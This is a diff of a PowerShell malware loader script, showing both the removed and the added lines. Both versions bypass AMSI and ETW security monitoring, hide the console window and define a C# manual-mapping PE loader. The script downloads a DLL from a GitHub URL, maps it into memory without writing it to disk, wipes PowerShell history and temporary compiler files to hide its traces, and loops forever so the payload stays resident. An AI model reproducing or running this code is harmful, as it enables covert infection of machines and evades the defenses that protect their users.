@@ -3,69 +3,60 @@ param()
 
 Set-StrictMode -Version Latest
 
-$VerbosePreference      = 'SilentlyContinue'
-$DebugPreference        = 'SilentlyContinue'
-$InformationPreference  = 'SilentlyContinue'
-$WarningPreference      = 'SilentlyContinue'
-$ErrorActionPreference  = 'SilentlyContinue'
-$ConfirmPreference      = 'None'
-$WhatIfPreference       = $false
+$VerbosePreference = 'SilentlyContinue'
+$DebugPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
+$ConfirmPreference = 'None'
+$WhatIfPreference = $false
 $PSModuleAutoLoadingPreference = 'None'
-$MaximumHistoryCount    = 0
+$MaximumHistoryCount = 0
 
 *> $null
 $Error.Clear()
 
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { exit }
+if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))) { exit }
 
-# ---------- 1. AMSI Bypass (Deep Patch) ----------
+# AMSI Bypass
 try {
-    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    $amsi.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
-    $scanBuffer = $amsi.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    if ($scanBuffer) {
-        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
-        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
-    }
+    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
 } catch {}
 
-# ---------- 2. ETW Bypass (RtlSetProcessTraceFlags) ----------
+# ETW Bypass (NtSetInformationProcess)
 try {
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
-    public class Etw {
-        [DllImport("ntdll.dll")] static extern int RtlSetProcessTraceFlags(IntPtr ProcessHandle, int Flags);
-        public static void Off() {
-            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
-            RtlSetProcessTraceFlags(p, 0);
-        }
-    }
+    public class Etw { [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
+    public static void Off() { IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle; IntPtr ptr = Marshal.AllocHGlobal(4);
+    Marshal.WriteInt32(ptr, 0); NtSetInformationProcess(p, 0x5E, ptr, 4); Marshal.FreeHGlobal(ptr); } }
 "@ -IgnoreWarnings
     [Etw]::Off()
 } catch {}
 
-# ---------- 3. Hide Console ----------
-Add-Type -Name Win -Namespace Console -MemberDefinition @'
+# Hide Console Window
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '@ -ErrorAction SilentlyContinue
-[Console.Win]::ShowWindow([Console.Win]::GetConsoleWindow(), 0)
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
-# ---------- 4. Full C# Local PE Loader (Manual Mapping) ----------
+# C# Local PE Loader (Manual Mapping)
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
 public class ManualMapResult { public IntPtr ImageBase; public uint ImageSize; public IntPtr DllMainAddr; public long Delta; public bool Is64Bit; }
 public static class NativeLoader {
-    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
-    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
-    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string n);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr LoadLibraryA(string n);
+    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
+    [DllImport("kernel32.dll")] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
+    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] static extern IntPtr GetModuleHandleA(string n);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] static extern IntPtr LoadLibraryA(string n);
     [DllImport("kernel32.dll")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
     [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
     const uint MC = 0x1000, MR = 0x2000, MF = 0x8000, PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
@@ -106,17 +97,18 @@ public static class NativeLoader {
 
 try { $type = Add-Type -TypeDefinition $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null } catch { $type = [NativeLoader] }
 
-# ---------- 5. Download DLL (memory only) ----------
+# Download and Map DLL in memory
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
     [NativeLoader]::Map($bytes, $true)
 } catch {}
 
-# ---------- 6. Cleanup traces ----------
+# Cleanup traces
 Clear-History
 $hp = (Get-PSReadlineOption).HistorySavePath
 if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
 
+# Delete Add-Type temp files
 Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
@@ -125,5 +117,5 @@ Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.Creation
 $bytes = $null; $kernel = $null; $type = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-# ---------- 7. Keep PowerShell alive (hidden) ----------
+# Keep PowerShell alive (hidden) so DLL stays in RAM
 while ($true) { Start-Sleep -Seconds 86400 }
